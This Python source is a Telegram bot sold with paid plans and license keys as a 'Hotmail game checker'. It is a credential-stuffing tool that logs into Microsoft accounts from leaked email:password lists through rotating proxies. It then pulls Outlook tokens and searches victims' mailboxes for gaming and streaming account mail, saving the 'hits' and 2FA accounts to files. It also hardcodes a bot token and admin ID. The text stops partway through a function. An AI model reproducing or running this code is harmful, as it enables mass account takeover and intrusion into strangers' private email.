import sys, os, re, json, time, random, threading, requests, zipfile
from urllib.parse import urlparse, parse_qs
from datetime import datetime, timedelta
import urllib3
from requests.adapters import HTTPAdapter
from urllib3.util.retry import Retry
from email.utils import parsedate_to_datetime

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

BOT_TOKEN = "8847630217:AAGcuENjLnIzHtUBbvxnKDBoa_DxW2a8yE0"
ADMIN_ID = 7969180514
ADMIN_USERNAME = "@imkansizligim"

THREAD_COUNT = 10
ADMIN_THREAD = 10

KEY_FILE = "keys.json"
USER_FILE = "users.json"

HITS_FILE = "hotmailbothits.txt"
TWOFA_FILE = "checkerbot2FA.txt"
ZIP_FILE = "hotmailgamechecker.zip"

user_proxies = {}
proxy_waiting = {}
user_proxy_index = {}

# === SUPERCELL OYUNLARI ===
SUPERCELL_GAMES = {
    "Brawl Stars": "Brawl Stars",
    "Clash Royale": "Clash Royale",
    "Clash of Clans": "Clash of Clans",
    "Hay Day": "Hay Day",
    "Squad Busters": "Squad Busters",
    "Boom Beach": "Boom Beach",
}

GAME_EMAILS = {
    "supercell": {"email": "noreply@id.supercell.com", "file": "supercellbothits.txt", "label": "🎮 SUPERCELL"},
    "konami": {"email": "konami-info@konami.net", "file": "konamibothits.txt", "label": "🕹️ KONAMI"},
    "efootball_coin": {"email": "konami-info@konami.net", "file": "efootballcoinbothits.txt", "label": "⚽ EFOOTBALL COIN", "content_search": "eFootball™ Coin"},
    "pubg": {"email": "noreply@pubgmobile.com", "file": "pubgbothits.txt", "label": "🔫 PUBG", "email2": "noreply@mail.pubgmobile.com"},
    "ea": {"email": "EA@e.ea.com", "file": "eabothits.txt", "label": "⚽ EA"},
    "epic": {"email": "help@acct.epicgames.com", "file": "epicbothits.txt", "label": "🎯 EPIC"},
    "steam": {"email": "noreply@steampowered.com", "file": "steambothits.txt", "label": "🎮 STEAM"},
    "riot": {"email": "noreply@mail.accounts.riotgames.com", "file": "riotbothits.txt", "label": "⚔️ RIOT"},
    "roblox": {"email": "no-reply@roblox.com", "file": "robloxbothits.txt", "label": "🎲 ROBLOX"},
    "discord": {"email": "noreply@discord.com", "file": "discordbothits.txt", "label": "💬 DISCORD"},
    "mojang": {"email": "noreply@mojang.com", "file": "mojangbothits.txt", "label": "⛏️ MOJANG"},
    "tiktok": {"email": "register@account.tiktok.com", "file": "tiktokbothits.txt", "label": "🎵 TIKTOK"},
    "netflix": {"email": "info@account.netflix.com", "file": "netflixbothits.txt", "label": "🎬 NETFLIX"},
}

PLANS = {
    "free": {"name": "Free", "daily_limit": 5000, "single_limit": 1500, "duration": None, "thread": 10},
    "daily": {"name": "Daily", "daily_limit": 0, "single_limit": 3000, "duration": 24, "thread": 10},
    "weekly": {"name": "Weekly", "daily_limit": 0, "single_limit": 5000, "duration": 168, "thread": 10},
    "monthly": {"name": "Monthly", "daily_limit": 0, "single_limit": 7000, "duration": 720, "thread": 10},
    "admin": {"name": "Admin", "daily_limit": 0, "single_limit": 0, "duration": None, "thread": None},
}

bakim_modu = False
tarama_durdur = {}
multi_bekleyen = {}
bekleyen_hesaplar = {}

keys_db = {}
users_db = {}

def load_user_proxies(chat_id, content):
    global user_proxies, user_proxy_index
    user_id = str(chat_id)
    user_proxies[user_id] = []
    user_proxy_index[user_id] = 0
    
    lines = content.strip().split('\n')
    for line in lines:
        line = line.strip()
        if line and not line.startswith('#'):
            user_proxies[user_id].append(line)
    
    return len(user_proxies[user_id])

def get_user_proxy(chat_id):
    global user_proxies, user_proxy_index
    user_id = str(chat_id)
    
    if user_id in user_proxies and user_proxies[user_id]:
        proxies = user_proxies[user_id]
        idx = user_proxy_index.get(user_id, 0)
        proxy = proxies[idx % len(proxies)]
        user_proxy_index[user_id] = idx + 1
        return proxy
    
    return None

def format_proxy(p):
    if not p:
        return None
    p = p.strip()
    if "://" in p:
        return p
    parts = p.split(":")
    if len(parts) == 4:
        return f"http://{parts[2]}:{parts[3]}@{parts[0]}:{parts[1]}"
    return f"http://{p}"

def load_db():
    global keys_db, users_db
    try:
        if os.path.exists(KEY_FILE):
            with open(KEY_FILE, 'r') as f:
                keys_db = json.load(f)
    except:
        keys_db = {}
    try:
        if os.path.exists(USER_FILE):
            with open(USER_FILE, 'r') as f:
                users_db = json.load(f)
    except:
        users_db = {}

def save_db():
    try:
        with open(KEY_FILE, 'w') as f:
            json.dump(keys_db, f, indent=2)
    except:
        pass
    try:
        with open(USER_FILE, 'w') as f:
            json.dump(users_db, f, indent=2)
    except:
        pass

def get_user_plan(chat_id):
    if str(chat_id) == str(ADMIN_ID):
        return "admin"
    user_id = str(chat_id)
    if user_id in users_db:
        user_data = users_db[user_id]
        plan = user_data.get("plan", "free")
        key_expires = user_data.get("key_expires")
        
        if plan != "free" and key_expires:
            expiry = datetime.fromisoformat(key_expires)
            if datetime.now() > expiry:
                users_db[user_id]["plan"] = "free"
                users_db[user_id]["key_expires"] = None
                users_db[user_id]["daily_used"] = 0
                save_db()
                send_message(chat_id, "⚠️ YOUR PLAN HAS EXPIRED\n\n📋 New Plan: Free")
                return "free"
            return plan
        
        return plan
    
    users_db[user_id] = {"plan": "free", "daily_used": 0, "last_reset": datetime.now().strftime('%Y-%m-%d')}
    save_db()
    return "free"

def get_plan_info(plan):
    return PLANS.get(plan, PLANS["free"])

def check_daily_reset(chat_id):
    user_id = str(chat_id)
    if user_id in users_db:
        today = datetime.now().strftime('%Y-%m-%d')
        last_reset = users_db[user_id].get("last_reset", today)
        if last_reset != today:
            users_db[user_id]["daily_used"] = 0
            users_db[user_id]["last_reset"] = today
            save_db()

def get_remaining_daily(chat_id):
    check_daily_reset(chat_id)
    plan = get_user_plan(chat_id)
    plan_info = get_plan_info(plan)
    daily_limit = plan_info["daily_limit"]
    if daily_limit == 0:
        return 999999999
    user_id = str(chat_id)
    daily_used = users_db.get(user_id, {}).get("daily_used", 0)
    return daily_limit - daily_used

def send_message(chat_id, text, reply_markup=None):
    try:
        data = {"chat_id": chat_id, "text": text}
        if reply_markup:
            data["reply_markup"] = json.dumps(reply_markup)
        requests.post(f"https://api.telegram.org/bot{BOT_TOKEN}/sendMessage", data=data, timeout=15)
    except:
        pass

def send_document(chat_id, filepath):
    try:
        with open(filepath, 'rb') as f:
            requests.post(f"https://api.telegram.org/bot{BOT_TOKEN}/sendDocument",
                          data={"chat_id": chat_id},
                          files={"document": (os.path.basename(filepath), f)}, timeout=30)
    except:
        pass

def download_file(file_id):
    try:
        file_info = requests.get(f"https://api.telegram.org/bot{BOT_TOKEN}/getFile",
                                 params={"file_id": file_id}, timeout=15).json()
        if not file_info.get("ok"):
            return None
        file_path = file_info["result"]["file_path"]
        file_url = f"https://api.telegram.org/file/bot{BOT_TOKEN}/{file_path}"
        content = requests.get(file_url, timeout=30).text
        return content
    except:
        return None

def generate_key(key_type):
    import secrets
    import string
    chars = string.ascii_uppercase + string.digits
    code = ''.join(secrets.choice(chars) for _ in range(4))
    code2 = ''.join(secrets.choice(chars) for _ in range(4))
    key = f"JULIANBOT-{key_type.upper()}-{code}-{code2}"
    
    keys_db[key] = {
        "type": key_type,
        "expires": None,
        "bound_to": None,
        "created": datetime.now().isoformat()
    }
    save_db()
    return key

def kerpetennecmi(line):
    line = line.strip()
    if not line:
        return None
    for sep in (":", "|", ";", ","):
        if sep in line:
            parts = line.split(sep, 1)
            email, pwd = parts[0].strip(), parts[1].strip()
            if email and pwd and "@" in email:
                return f"{email}:{pwd}"
    return None

def cokludosyayukle(dosya_listesi):
    tum_hesaplar = []
    for dosya in dosya_listesi:
        dosya = dosya.strip()
        if not dosya:
            continue
        if not os.path.exists(dosya):
            continue
        try:
            with open(dosya, 'r', encoding='utf-8', errors='ignore') as f:
                satirlar = [l.strip() for l in f if ':' in l.strip() and not l.strip().startswith('#')]
            for satir in satirlar:
                norm = kerpetennecmi(satir)
                if norm:
                    tum_hesaplar.append(norm)
        except:
            pass
    benzersiz = list(dict.fromkeys(tum_hesaplar))
    return benzersiz

batmanparkyetkilisi = [
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:120.0) Gecko/20100101 Firefox/120.0",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",
    "Mozilla/5.0 (iPhone; CPU iPhone OS 17_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.1 Mobile/15E148 Safari/604.1",
    "Mozilla/5.0 (Linux; Android 14; SM-S918B) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Mobile Safari/537.36",
]

def ataturkparki():
    return random.choice(batmanparkyetkilisi)

class marazali:
    REQ = 25

    def __init__(self, email, password, proxy=None):
        self.email = email
        self.password = password
        self.proxy = proxy
        self.s = self.toyotacorollabest()
        if proxy:
            self.s.proxies = {"http": proxy, "https": proxy}
        self.cid = ""
        self.gelsinhayatbildigigibi = None
        self.bilmemhangiruzgaratti = None
        self.sahteparantezleracmasakin = (
            "https://login.live.com/oauth20_authorize.srf?client_id=00000000402B5328"
            "&redirect_uri=https://login.live.com/oauth20_desktop.srf"
            "&scope=service::user.auth.xboxlive.com::MBI_SSL"
            "&display=touch&response_type=token&locale=en"
        )

    def toyotacorollabest(self):
        s = requests.Session()
        retry = Retry(total=3, backoff_factor=1, status_forcelist=[429, 500, 502, 503, 504])
        adapter = HTTPAdapter(max_retries=retry, pool_connections=50, pool_maxsize=50)
        s.mount("https://", adapter)
        s.mount("http://", adapter)
        return s

    def nihathatipoglu(self, tag):
        try:
            h = {
                "User-Agent": ataturkparki(),
                "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8",
                "Accept-Language": "en-US,en;q=0.9",
                "Connection": "keep-alive",
            }
            r = self.s.get(self.sahteparantezleracmasakin, headers=h, timeout=self.REQ, verify=False)
            text = r.text
            m = (re.search(r'value=\\"(.+?)\\"', text, re.S)
                 or re.search(r'value="(.+?)"', text, re.S)
                 or re.search(r"sFTTag:'(.+?)'", text, re.S)
                 or re.search(r'sFTTag:"(.+?)"', text, re.S)
                 or re.search(r'name="PPFT".*?value="(.+?)"', text, re.S))
            if not m:
                return "BAD"
            sFTTag = m.group(1)
            m2 = (re.search(r'"urlPost":"(.+?)"', text, re.S)
                  or re.search(r"urlPost:'(.+?)'", text, re.S)
                  or re.search(r'urlPost:"(.+?)"', text, re.S)
                  or re.search(r'<form.*?action="(.+?)"', text, re.S))
            if not m2:
                return "BAD"
            urlPost = m2.group(1).replace("&amp;", "&")
            data = {
                "login": self.email,
                "loginfmt": self.email,
                "passwd": self.password,
                "PPFT": sFTTag
            }
            h2 = {
                "Content-Type": "application/x-www-form-urlencoded",
                "User-Agent": ataturkparki(),
                "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
                "Accept-Language": "en-US,en;q=0.9",
                "Connection": "close"
            }
            r2 = self.s.post(urlPost, data=data, headers=h2,
                             allow_redirects=True, timeout=self.REQ, verify=False)
            if "#" in r2.url and r2.url != self.sahteparantezleracmasakin:
                token = parse_qs(urlparse(r2.url).fragment).get("access_token", ["None"])[0]
                if token != "None":
                    self.gelsinhayatbildigigibi = token
                    return "SUCCESS"
            if "cancel?mkt=" in r2.text:
                try:
                    kotukardesim = re.search(r'(?<="ipt" value=").+?(?=">)', r2.text)
                    oyleeeemi = re.search(r'(?<="pprid" value=").+?(?=">)', r2.text)
                    hmmm = re.search(r'(?<="uaid" value=").+?(?=">)', r2.text)
                    if kotukardesim and oyleeeemi and hmmm:
                        dota2mioynuyoz = {"ipt": kotukardesim.group(), "pprid": oyleeeemi.group(), "uaid": hmmm.group()}
                        action = re.search(r'(?<=id="fmHF" action=").+?(?=" )', r2.text)
                        if action:
                            ret = self.s.post(action.group(), data=dota2mioynuyoz,
                                              allow_redirects=True, timeout=self.REQ, verify=False)
                            kurmancihergulee = re.search(r'(?<="recoveryCancel":{"returnUrl":").+?(?=",)', ret.text)
                            if kurmancihergulee:
                                fin = self.s.get(kurmancihergulee.group(), allow_redirects=True,
                                                 timeout=self.REQ, verify=False)
                                token = parse_qs(urlparse(fin.url).fragment).get("access_token", ["None"])[0]
                                if token != "None":
                                    self.gelsinhayatbildigigibi = token
                                    return "SUCCESS"
                except:
                    pass
            if any(v in r2.text for v in [
                "recover?mkt", "account.live.com/identity/confirm?mkt",
                "Email/Confirm?mkt", "/Abuse?mkt=", ",AC:null,urlFedConvertRename"
            ]):
                return "2FA"
            fatihterim = r2.text.lower()
            if any(v in fatihterim for v in [
                "password is incorrect", "account doesn't exist",
                "that microsoft account doesn't exist",
                "sign in to your microsoft account",
                "tried to sign in too many times",
                "help us protect your account", "your account or password is incorrect"
            ]):
                return "BAD"
            return "BAD"
        except:
            return "ERROR"

    def kimseyisevemem(self, tag):
        try:
            self.sahteparantezleracmasakin = (
                "https://login.live.com/oauth20_authorize.srf?"
                "client_id=00000000402B5328"
                "&response_type=token"
                "&scope=service%3A%3Aoutlook.office.com%3A%3AMBI_SSL"
                "&redirect_uri=https%3A%2F%2Flogin.live.com%2Foauth20_desktop.srf"
                "&prompt=none"
            )
            h = {"User-Agent": ataturkparki()}
            r = self.s.get(self.sahteparantezleracmasakin, headers=h, timeout=self.REQ, verify=False, allow_redirects=True)
            parsed = urlparse(r.url)
            if parsed.fragment:
                tok = parse_qs(parsed.fragment).get("access_token", [None])[0]
                if tok:
                    self.gelsinhayatbildigigibi = tok
                    return tok
            self.soyleyememyeminederim = (
                "https://login.live.com/oauth20_authorize.srf?"
                "client_id=0000000048170EF2"
                "&response_type=token"
                "&scope=https%3A%2F%2Fsubstrate.office.com%2FUser-Internal.ReadWrite"
                "&redirect_uri=https%3A%2F%2Flogin.live.com%2Foauth20_desktop.srf"
                "&prompt=none"
            )
            r = self.s.get(self.soyleyememyeminederim, headers=h, timeout=self.REQ, verify=False, allow_redirects=True)
            parsed = urlparse(r.url)
            if parsed.fragment:
                tok = parse_qs(parsed.fragment).get("access_token", [None])[0]
                if tok:
                    self.bilmemhangiruzgaratti = tok
                    return tok
            return None
        except:
            return None

    def ahhhelerimtitriyor(self, tag):
        try:
            pikniksararbugunlerde = self.s.cookies.get("MSPCID", "")
            if pikniksararbugunlerde:
                self.cid = pikniksararbugunlerde.upper()
                return True
            ofbiratesbasiyor = re.search(r'MSPCID=([^;\s]+)', str(self.s.cookies))
            if ofbiratesbasiyor:
                self.cid = ofbiratesbasiyor.group(1).upper()
                return True
            self.cid = self.email.upper().replace("@", "").replace(".", "")
            return True
        except:
            return False

    def _search_query(self, query, token):
        """Tek bir sorgu için arama yap"""
        try:
            url = "https://outlook.live.com/search/api/v2/query"
            params = {"n": "124", "cv": "tNZ1DVP5NhDwG%2FDUCelaIu.124"}
            body = {
                "Cvid": "7ef2720e-6e59-ee2b-a217-3a4f427ab0f7",
                "Scenario": {"Name": "owa.react"},
                "TimeZone": "Egypt Standard Time",
                "TextDecorations": "Off",
                "EntityRequests": [{
                    "EntityType": "Conversation",
                    "ContentSources": ["Exchange"],
                    "Filter": {"Or": [
                        {"Term": {"DistinguishedFolderName": "msgfolderroot"}},
                        {"Term": {"DistinguishedFolderName": "DeletedItems"}}
                    ]},
                    "From": 0,
                    "Query": {"QueryString": query},
                    "RefiningQueries": None,
                    "Size": 500,
                    "Sort": [{"Field": "Time", "SortDirection": "Desc"}],
                    "EnableTopResults": True,
                    "TopResultsCount": 3
                }],
                "AnswerEntityRequests": [{
                    "Query": {"QueryString": query},
                    "EntityTypes": ["Event", "File"],
                    "From": 0,
                    "Size": 10,
                    "EnableAsyncResolution": True
                }],
                "QueryAlterationOptions": {
                    "EnableSuggestion": True,
                    "EnableAlteration": True,
                    "SupportedRecourseDisplayTypes": ["Suggestion", "NoResultModification", "NoResultFolderRefinerModification", "NoRequeryModification", "Modification"]
                },
                "LogicalId": "446c567a-02d9-b739-b9ca-616e0d45905c"
            }
            h = {
                "User-Agent": "Outlook-Android/2.0",
                "Authorization": f"Bearer {token}",
                "X-AnchorMailbox": f"CID:{self.cid}",
                "Connection": "Keep-Alive",
                "Accept-Encoding": "gzip",
                "Content-Type": "application/json",
            }
            r = self.s.post(url, params=params, headers=h, json=body, timeout=self.REQ, verify=False)
            
            if r.status_code == 200:
                data = r.json()
                total = 0
                son_tarih = None
                
                for es in data.get("EntitySets", []):
                    if es.get("Total") is not None:
                        total = es.get("Total", 0)
                        break
                
                for es in data.get("EntitySets", []):
                    results = es.get("Results", [])
                    if results:
                        first_result = results[0]
                        date_str = first_result.get("DateTimeReceived") or first_result.get("DateTimeLastModified")
                        if date_str:
                            try:
                                son_tarih = parsedate_to_datetime(date_str)
                            except:
                                pass
                        break
                
                if total == 0:
                    total_match = re.search(r'"Total":\s*(\d+)', r.text)
                    if total_match:
                        total = int(total_match.group(1))
                
                return total, son_tarih, r.text
            return 0, None, ""
        except:
            return 0, None, ""

    def search_messages(self, tag, game_key, token):
        game_data = GAME_EMAILS[game_key]
        
        if "content_search" in game_data:
            query = game_data["content_search"]
            sayi, tarih, _ = self._search_query(query, token)
            return sayi, tarih
        
        # PUBG özel durum: iki e-posta adresi
        if game_key == "pubg" and "email2" in game_data:
            query1 = f'from:"{game_data["email"]}"'
            sayi1, tarih1, _ = self._search_query(query1, token)
            
            query2 = f'from:"{game_data["email2"]}"'
            sayi2, tarih2, _ = self._search_query(query2, token)
            
            # İkisini birleştir, tekrar yok
            toplam = sayi1 + sayi2
            
            # En yeni tarihi al
            tarihler = [t for t in [tarih1, tarih2] if t]
            en_yeni = max(tarihler) if tarihler else None
            
            return toplam, en_yeni
        
        # Normal durum: tek e-posta
        query = f'from:"{game_data["email"]}"'
        sayi, tarih, _ = self._search_query(query, token)
        return sayi, tarih

    def supercell_oyunlari_bul(self, token):
        """Supercell mesajlarındaki oyunları bul"""
        try:
            # Tüm Supercell mesajlarını al
            query = f'from:"noreply@id.supercell.com"'
            sayi, tarih, text = self._search_query(query, token)
            
            if sayi == 0:
                return []
            
            oyunlar = []
            for game_name in SUPERCELL_GAMES.keys():
                if game_name.lower() in text.lower():
                    oyunlar.append(f"{game_name} ✅")
            
            return oyunlar
        except:
            return []

    def check(self, tag):
        status = self.nihathatipoglu(tag)
        if status != "SUCCESS":
            return status, None
        self.ahhhelerimtitriyor(tag)
        token = self.kimseyisevemem(tag)
        if not token:
            return "BAD", None
        
        time.sleep(1)
        
        mesaj_info = {}
        
        for game_key, game_data in GAME_EMAILS.items():
            sayi, tarih = self.search_messages(tag, game_key, token)
            
            oyunlar = []
            if game_key == "supercell" and sayi > 0:
                oyunlar = self.supercell_oyunlari_bul(token)
            
            mesaj_info[game_key] = {
                "sayi": sayi,
                "tarih": tarih.strftime('%Y-%m-%d %H:%M:%S') if tarih else 'N/A',
                "oyunlar": oyunlar
            }
            time.sleep(0.5)
        
        return "SUCCESS", mesaj_info

def create_zip():
    try:
        with zipfile.ZipFile(ZIP_FILE, 'w', zipfile.ZIP_DEFLATED) as zf:
            all_files = [HITS_FILE, TWOFA_FILE]
            for game_key, game_data in GAME_EMAILS.items():
                all_files.append(game_data["file"])
            for f in all_files:
                if os.path.exists(f) and os.path.getsize(f) > 0:
                    zf.write(f, os.path.basename(f))
        return True
    except:
        return False

def benferooolum():
    all_files = [HITS_FILE, TWOFA_FILE]
    for game_key, game_data in GAME_EMAILS.items():
        all_files.append(game_data["file"])
    for f in all_files:
        with open(f, 'w', encoding='utf-8') as fh:
            pass

def ana_menu(chat_id):
    if str(chat_id) == str(ADMIN_ID):
        plan = "Admin"
        kalan = "Unlimited"
        thread = ADMIN_THREAD
    else:
        plan_name = get_user_plan(chat_id)
        plan_info = get_plan_info(plan_name)
        plan = plan_info["name"]
        
        user_id = str(chat_id)
        user_data = users_db.get(user_id, {})
        key_expires = user_data.get("key_expires")
        
        if key_expires and plan != "Free":
            expiry = datetime.fromisoformat(key_expires)
            remaining = expiry - datetime.now()
            days = remaining.days
            hours = remaining.seconds // 3600
            minutes = (remaining.seconds % 3600) // 60
            kalan = f"{days}d {hours}h {minutes}m"
        else:
            kalan = "Unlimited"
        
        thread = plan_info["thread"]
    
    keyboard = {
        "inline_keyboard": [
            [{"text": "🚀 Start", "callback_data": "baslat"},
             {"text": "📂 Multi Scan", "callback_data": "multi_start"}],
            [{"text": "📊 Status", "callback_data": "durum"},
             {"text": "🔑 Enter Key", "callback_data": "key_giris"}],
            [{"text": "💰 Prices", "callback_data": "fiyatlar"},
             {"text": "📡 Proxy", "callback_data": "proxy"}],
        ]
    }
    
    if str(chat_id) == str(ADMIN_ID):
        keyboard["inline_keyboard"].insert(0, [{"text": "⚡ Thread Settings", "callback_data": "thread_menu"}])
        keyboard["inline_keyboard"].insert(2, [{"text": "🔑 Create Key", "callback_data": "key_olustur"}])
    
    text = (
        f"╔══════════════════════════════════════════════╗\n"
        f"║     HOTMAIL GAME CHECKER - JULIAN BOT       ║\n"
    )
    if str(chat_id) == str(ADMIN_ID):
        text += f"║     👑 ADMIN PANEL 👑                       ║\n"
    text += f"╚══════════════════════════════════════════════╝\n\n"
    text += f"📋 Plan: {plan}\n"
    text += f"⏳ Remaining: {kalan}\n"
    text += f"⚡ Thread: {thread}\n"
    
    send_message(chat_id, text, keyboard)

def proxy_menu(chat_id):
    user_id = str(chat_id)
    count = len(user_proxies.get(user_id, []))
    
    keyboard = {
        "inline_keyboard": [
            [{"text": "📥 Proxy Ekle", "callback_data": "proxy_ekle"},
             {"text": "🗑️ Proxy Sil", "callback_data": "proxy_sil"}],
            [{"text": "🔙 Back", "callback_data": "main_menu"}],
        ]
    }
    send_message(chat_id, f"📡 PROXY MENU\n\nLoaded: {count} proxies", keyboard)

def fiyat_menu(chat_id):
    text = (
        f"💰 PRICE LIST\n\n"
        f"📋 PLANS:\n"
        f"────────────────────────────\n"
        f"Daily: 750 TCoin\n"
        f"Weekly: 3.000 TCoin\n"
        f"Monthly: 9.000 TCoin\n\n"
        f"💡 Contact: {ADMIN_USERNAME}"
    )
    send_message(chat_id, text)

def durum_menu(chat_id):
    if str(chat_id) == str(ADMIN_ID):
        aktif_keyler = len([k for k, v in keys_db.items() if not v.get("expires") or datetime.fromisoformat(v["expires"]) > datetime.now()])
        satilan_keyler = len([k for k, v in keys_db.items() if v.get("bound_to")])
        toplam_kullanici = len(users_db)
        premium = len([u for u in users_db.values() if u.get("plan") != "free"])
        free = toplam_kullanici - premium
        
        text = (
            f"👑 ADMIN STATUS\n\n"
            f"📋 Plan: Admin\n"
            f"⏳ Remaining: Unlimited\n"
            f"📊 Scanning: Unlimited\n"
            f"⚡ Thread: {ADMIN_THREAD}\n\n"
            f"━━━━━━━━━━━━━━━━━━\n"
            f"Active Keys: {aktif_keyler}\n"
            f"Sold Keys: {satilan_keyler}\n"
            f"Total Users: {toplam_kullanici}\n"
            f"Premium: {premium}\n"
            f"Free: {free}"
        )
    else:
        plan_name = get_user_plan(chat_id)
        plan_info = get_plan_info(plan_name)
        plan = plan_info["name"]
        
        user_id = str(chat_id)
        user_data = users_db.get(user_id, {})
        key_expires = user_data.get("key_expires")
        
        if key_expires and plan != "Free":
            expiry = datetime.fromisoformat(key_expires)
            remaining = expiry - datetime.now()
            days = remaining.days
